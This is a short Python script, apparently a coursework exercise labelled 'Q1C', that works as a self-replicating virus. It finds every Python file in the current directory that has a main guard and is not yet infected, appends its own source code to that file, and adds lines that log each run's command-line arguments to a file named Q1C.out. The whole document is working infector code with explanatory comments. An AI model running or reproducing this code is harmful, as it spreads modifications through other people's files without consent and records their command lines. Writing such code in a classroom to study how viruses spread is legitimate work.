import os, sys

#Iterate through all files in the current directory
for filename in os.listdir():
    #check if the file is a Python file
    if filename.endswith('.py'):
    #open the file and read its contents
        with open(filename, 'r') as file:
            lines = file.readlines()
            
            #check if the file already contains the code
            if "if __name__ == '__main__':\n" in lines or 'if __name__ == "__main__":\n' in lines:
                if "                        file.write('Q1C.close()\\n')\n" in lines:
                    pass
                else:
                    #open the file in append mode
                    with open(filename, 'a') as file:
                        
                        #New line to ensure no syntax errors
                        file.write('\n')

                        #Copy Q1C code to the file
                        with open(__file__, 'r') as q1c_file:
                            q1c_lines = q1c_file.readlines()
                            i = 0
                            #iterate through the lines of infected file until we fine the portion that is Q1C code
                            while q1c_lines[i] != 'import os, sys\n':
                                i += 1
                        
                            #Write the Q1C code to the file
                            while q1c_lines[i - 1] != "                        file.write('Q1C.close()\\n')\n":
                                file.write(q1c_lines[i])
                                i += 1
                        

                        #append the code to the file
                        file.write('Q1C = open("Q1C.out", "a")\n')
                        #Write the entire command line used to run the script accounting for the fact that no arguments were passed
                        file.write('for arg in sys.argv:\n')
                        file.write('    if arg.endswith(".py"):\n')
                        file.write('        Q1C.write(f"\\n{arg} ")\n')
                        file.write('    else:\n')
                        file.write('        Q1C.write(f"{arg} ")\n')
                        #Close the file
                        file.write('Q1C.close()\n')
                